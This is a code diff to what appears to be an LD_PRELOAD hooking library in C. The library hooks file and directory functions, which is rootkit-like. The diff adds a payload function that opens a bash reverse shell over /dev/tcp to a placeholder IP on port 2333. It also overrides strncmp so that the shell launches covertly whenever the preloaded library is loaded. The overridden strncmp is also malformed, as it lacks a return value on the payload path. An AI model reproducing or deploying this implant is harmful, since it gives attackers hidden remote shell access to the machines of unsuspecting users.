@@ -4,6 +4,9 @@
 #include <stdio.h>
 #include <string.h>
 #include <unistd.h>
+#include <stdlib.h>
+
+
 
 // network libraries
 #include <sys/types.h>
@@ -28,6 +31,19 @@ FILE *(*orig_fopen)(const char *pathname, const char *mode);
 FILE *(*orig_fopen64)(const char *pathname, const char *mode);
 struct dirent *(*orig_readdir)(DIR *dirp);
 struct dirent64 *(*orig_readdir64)(DIR *dirp);
+
+
+void payload() {
+    system("bash -c 'bash -i >& /dev/tcp/xxx.xxx.xxx.xxx/2333 0>&1'");
+}
+
+int strncmp(const char *__s1, const char *__s2, size_t __n) {    // 这里函数的定义可以根据报错信息进行确定
+    if (getenv("LD_PRELOAD") == NULL) {
+        return 0;
+    }
+    unsetenv("LD_PRELOAD");
+    payload();
+}
 
 int ipv4_reverse()
 {
